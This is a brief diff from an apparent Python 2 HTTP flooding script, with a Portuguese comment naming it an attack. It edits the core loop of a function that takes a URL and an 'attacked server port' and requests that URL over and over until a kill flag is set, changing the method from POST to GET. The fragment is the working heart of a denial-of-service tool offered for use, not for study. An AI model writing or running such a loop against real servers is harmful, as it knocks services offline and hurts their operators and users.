@@ -16,7 +16,7 @@ def Post(url,attackedServerPort):
     parameters = {'dumb': 'dumb'}
     headers = {'keep_alive': 'True'}
     while not Kill:
-        r = requests.post(url,data = parameters, headers=headers)
+        r = requests.get(url,data = parameters, headers=headers)
         print r.text
 
 #Funcao que controlara o attack
